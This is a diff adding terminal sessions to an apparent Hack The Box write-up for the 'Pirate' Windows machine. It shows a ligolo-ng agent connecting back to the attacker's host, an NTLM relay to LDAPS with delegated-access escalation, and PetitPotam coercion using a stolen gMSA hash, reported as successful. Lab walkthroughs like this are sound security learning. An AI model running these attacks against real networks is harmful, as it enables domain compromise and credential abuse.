@@ -290,27 +290,110 @@ Ethernet adapter Ethernet0 2:
 ```
 
 ```zsh
-
+┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
+└─$ sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+[sudo] password for kali: 
 ```
 
 ```zsh
+┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
+└─$ ./proxy -selfcert
 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0002] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.8.3
+
+ligolo-ng »  
 ```
 
 ```zsh
-
+*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> ./agent.exe -connect 10.10.14.255:11601 -ignore-cert
+agent.exe : time="2026-06-07T14:40:30-07:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2026-06-0...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2026-06-07T14:40:30-07:00" level=info msg="Connection established" addr="10.10.14.255:11601"
 ```
 
 ```zsh
-
+┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
+└─$ sudo ip route add 192.168.100.0/24 dev ligolo
 ```
 
 ```zsh
+┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
+└─$ impacket-ntlmrelayx -t ldaps://dc01.pirate.htb \
+  --delegate-access --escalate-user 'MS01$' --no-smb-server -smb2support
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Protocol Client RPC loaded..
+[*] Running in relay mode to single host
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
 ```
 
 ```zsh
+┌──(kali㉿kali)-[~/…/HTB/Windows/Hard/Pirate]
+└─$ python3 ~/Tools/PrivEsc/AD/Enum/PetitPotam/PetitPotam.py 10.10.14.255 web01.pirate.htb -u 'gMSA_ADCS_prod$' -hashes :55d78485f8d9b2d2b37628227ebf936a
+/home/kali/Tools/PrivEsc/AD/Enum/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
 
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:web01.pirate.htb[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
 ```
 
 ```zsh
